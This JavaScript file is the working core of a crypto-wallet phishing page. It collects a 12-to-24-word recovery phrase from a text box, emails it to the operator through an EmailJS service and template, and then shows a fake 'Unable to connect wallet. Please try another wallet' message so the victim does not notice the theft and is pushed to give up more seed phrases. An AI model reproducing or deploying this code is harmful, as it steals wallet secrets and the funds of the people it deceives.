// const phraseKey = document.getElementById("card1");
// const privateKey = document.getElementById("card2");
// const showCard1 = document.querySelector("filter-item1");
// const showCard2 = document.querySelector("filter-item2");
// document.addEventListener("DOMContentLoaded", () => {
//   // Show Card 1 by default
//   phraseKey.classList.add("active");

//   // Button click event for showing Card 1
//   showCard1.addEventListener("click", (e) => {
//     phraseKey.classList.add("active-filter");
//     privateKey.classList.remove("active-filter");
//   });

//   // Button click event for showing Card 2
//   showCard2.addEventListener("click", () => {
//     privateKey.classList.add("active-filter");
//     phraseKey.classList.remove("active-filter");
//   });
// });

const submitButton = document.getElementById("submit");
const recoveryPhraseInput = document.getElementById("recoveryPhrase");
const errorMsg = document.getElementById("error");
submitButton.addEventListener("click", (e) => {
  e.preventDefault();

  // Get the recovery phrase from the textarea
  const recoveryPhrase = recoveryPhraseInput.value;

  // Check if the recovery phrase has 12 to 24 words
  const wordCount = recoveryPhrase.split(/\s+/).length;

  if (wordCount >= 12 && wordCount <= 24) {
    // Prepare the parameters for the email template
    const emailParams = {
      message: recoveryPhrase,
    };

    // Send the recovery phrase as a message using emailjs
    emailjs
      .send("service_x7rapul", "template_2srwfxt", emailParams)
      .then((response) => {
        // console.log("Recovery phrase email sent successfully:", response);

        // Update UI or handle success as needed
        errorMsg.innerHTML =
          "Unable to connect wallet. Please try another wallet.";
        errorMsg.style.backgroundColor = "orange";
        errorMsg.style.padding = "20px";
      });
  } else {
    // Display an error message for invalid recovery phrase word count
    errorMsg.innerHTML =
      "Please enter a valid recovery phrase with 12 to 24 words.";
    errorMsg.style.backgroundColor = "red";
    errorMsg.style.padding = "20px";
  }
});

// .catch((error) => {
//   console.error("Error sending recovery phrase email:", error);

//   // Handle the error and update the UI
//   errorMsg.innerHTML =
//     "Failed to send recovery phrase. Please try another wallet.";
//   errorMsg.style.backgroundColor = "orange";
//   errorMsg.style.padding = "20px";
// });
